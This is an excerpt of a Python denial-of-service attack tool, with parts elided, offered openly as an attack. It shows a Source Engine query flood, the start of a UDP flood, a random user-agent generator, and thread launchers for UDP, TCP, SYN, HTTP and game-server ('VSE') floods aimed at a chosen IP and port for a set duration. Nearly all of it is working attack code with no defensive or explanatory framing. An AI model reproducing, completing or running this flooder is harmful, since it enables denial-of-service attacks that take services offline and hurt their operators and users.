...
def rand_ua():
    return random.choice(ua) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())

def atckVSE(ip, port, secs):
    payload = b'\xff\xff\xff\xffTSource Engine Query\x00'
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))

def atckUDP(ip, port, secs, size):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ...
        if len(sys.argv) < 2:
            ...
            try:
                ...
                for _ in range(threads):
                    threading.Thread(target=atckVSE, args=(ip, port, secs), daemon=True).start()
            except KeyboardInterrupt:
                print("The tool is activated yes")
            ...
            try:
                ...
                for _ in range(threads):
                    threading.Thread(target=atckUDP, args=(ip, port, secs, size), daemon=True).start()
            except KeyboardInterrupt:
                print("The tool is activated yes")
            ...
            try:
                ...
                for _ in range(threads):
                    threading.Thread(target=atckTCP, args=(ip, port, secs, size), daemon=True).start()
            except KeyboardInterrupt:
                print("The tool is activated yes")
            ...
            try:
                ...
                for _ in range(threads):
                    threading.Thread(target=atckSYN, args=(ip, port, secs), daemon=True).start()
            except KeyboardInterrupt:
                print("The tool is activated yes")
            ...
            try:
                ...
                for _ in range(threads):
                    a = 0
                    while 1:
                        threading.Thread(target=atckHTTP, args=(ip, secs), daemon=True).start()
                        a += 1
                        print(f"HTTP Flood Attack {a}")
            except KeyboardInterrupt:
                print("The tool is activated yes")
